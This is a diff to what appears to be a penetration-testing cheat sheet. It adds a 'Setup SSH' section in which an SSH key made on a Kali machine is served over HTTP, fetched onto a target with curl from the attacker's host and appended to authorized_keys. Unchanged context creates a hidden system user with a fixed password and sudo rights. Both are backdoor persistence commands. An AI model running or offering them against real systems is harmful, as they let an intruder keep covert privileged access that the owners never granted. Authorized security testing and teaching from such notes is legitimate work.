@@ -226,3 +226,14 @@ int main ()
 ```bash
 sudo adduser --system --shell /bin/bash --no-create-home us3r && echo -e 'Testp4ssw0rd\nTestp4ssw0rd' | sudo passwd us3r && sudo usermod -aG sudo us3r
 ```
+
+## Setup SSH
+
+(kali)
+`ssh-keygen -t rsa -b 4096 -C "$username@$domain" -f ./created_id_rsa`
+`python3 -m http.server 8080`
+
+(target)
+`curl -L http://$hip:8080/created_id_rsa.pub -o id_rsa.pub`
+`cat id_rsa.pub >> .ssh/authorized_keys`
+`chmod 600 .ssh/authorized_keys`
